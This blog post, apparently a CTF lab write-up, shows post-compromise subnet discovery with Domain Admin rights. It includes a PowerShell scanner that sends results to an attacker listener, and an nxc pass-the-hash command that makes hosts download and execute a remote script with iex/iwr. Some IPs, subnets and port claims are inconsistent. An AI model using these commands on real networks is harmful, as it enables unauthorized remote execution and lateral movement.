---
title: "Hunting Subnets in a CTF Lab"
date: 2024-06-25T13:00:30-06:00
categories:
  - blog
tags:
  - powershell
  - subnets
  - CTF
  - OSCP
---

## Introduction
During a recent lab session, I encountered a challenging but exciting task: hunting down subnets. Armed with Domain Admin (DA) privileges on the main domain, I was set to make the exercise an intriguing venture. Despite the inherent lack of operational security (OpSec) safety in my approach, the process was thoroughly engaging.

### **Toolset**

- **PowerShell Scripting**: Utilized for probing subnet addresses.
- **socat**: Employed to listen for incoming UDP traffic.
- **NXC Command**: Used to execute commands across the network.
- **Web Server**: Used stage our powershell.

### **PowerShell Script**

To efficiently identify open ports across subnet addresses, I crafted a PowerShell script designed to check port 445 (SMB) and report back to my attacker box:

```powershell
$ListenerIP = "10.10.15.252"
$ListenerPort = 5001
$subnet = "172.16.2"
$Ports = @(80, 445, 139, 22, 21, 88, 389, 636, 443, 8080, 8000)
$udpclient = New-Object System.Net.Sockets.UdpClient

1..254 | ForEach-Object {
    $ip = "$subnet.$_"
    Foreach ($p in $Ports) {
        try {
            $socket = New-Object System.Net.Sockets.TcpClient
            $async = $socket.BeginConnect($ip, $p, $null, $null)
            if ($async.AsyncWaitHandle.WaitOne(1000, $false)) {
                $result = "$env:computername - $ip - $p is open`n"
				$udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
            } else {
                $result = "$env:computername - $ip - $p is closed`n"
				# $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
            }
            $socket.Close()
        } catch {
            $result = "$env:computername - $ip - $p encountered an error`n"
            $udpclient.Send([Text.Encoding]::ASCII.GetBytes($result), $result.Length, $ListenerIP, $ListenerPort)
        }
    }
}
$udpclient.Close()
```

### Socat Command

For real-time result collection, socat was configured to listen on UDP port 5001:

```bash
socat UDP-RECV:5001 STDOUT
```

### NXC Command

```bash
nxc smb 172.30.1.0/24 -u DA -H 700168xxxxxxxx39bd67e0 -x 'powershell -c "iex (iwr http://10.10.45.252:8000/tools/psscan.ps1 -usebasic)"'
```

### The Output

```bash
DC01 - 172.16.2.100 - 445 is closed
FS01 - 172.16.2.100 - 445 is closed
DC01 - 172.16.2.101 - 445 is closed
DC01 - 172.16.2.102 - 445 is open
FS0 - 172.16.2.101 - 445 is closed
FS01 - 172.16.2.102 - 445 is closed
MS01 - 172.16.2.100 - 445 is closed
WIN01 - 172.16.2.100 - 445 is closed
MS01 - 172.16.2.101 - 445 is closed
WIN01 - 172.16.2.101 - 445 is closed
WSADM1 - 172.16.2.100 - 445 is closed
MS01 - 172.16.2.102 - 445 is closed
WIN01 - 172.16.2.102 - 445 is closed
WSADM1 - 172.16.2.101 - 445 is closed
WSADM1 - 172.16.2.102 - 445 is closed
SQL01 - 172.16.2.100 - 445 is closed
SQL01 - 172.16.2.101 - 445 is closed
SQL01 - 172.16.2.102 - 445 is closed
```

### Conclusion
While not necessarily OpSec safe, this exercise was a fun and effective way to explore and understand the network layout and security posture regarding SMB ports within the lab's domain. The use of automated scripts and real-time data exfiltration offered a dynamic approach to network exploration.

We can easily adapt the ports to check, or even nest another For loop to add checking for multiple subnets.  I already had an idea of what i was going to find, and was only interested in the existence of the subnet, so i opted for only port **(Updated the script since)** and was content with running this multiple times to get what i needed.
